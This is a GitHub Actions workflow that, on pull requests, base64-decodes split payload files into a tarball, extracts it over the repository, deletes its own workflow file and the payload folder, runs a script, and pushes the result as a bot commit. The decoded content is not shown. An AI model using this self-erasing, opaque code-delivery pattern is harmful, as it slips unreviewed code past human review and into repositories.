name: One-time ConditionLatch materializer

on:
  pull_request:
    branches: [main]

permissions:
  contents: write

jobs:
  materialize:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
          fetch-depth: 0
      - name: Materialize audited repository payload
        shell: bash
        run: |
          set -euo pipefail
          cat .bootstrap/payload.part* | tr -d '\n\r' | base64 -d > /tmp/conditionlatch.tar.gz
          tar -xzf /tmp/conditionlatch.tar.gz -C .
          rm -rf .bootstrap
          rm -f .github/workflows/materialize.yml
          python scripts/preflight.py
          python -m compileall -q contracts tests scripts
      - name: Commit exact materialized source to PR branch
        shell: bash
        run: |
          set -euo pipefail
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git commit -m "Implement and harden ConditionLatch primitive"
          git push origin HEAD:${{ github.head_ref }}
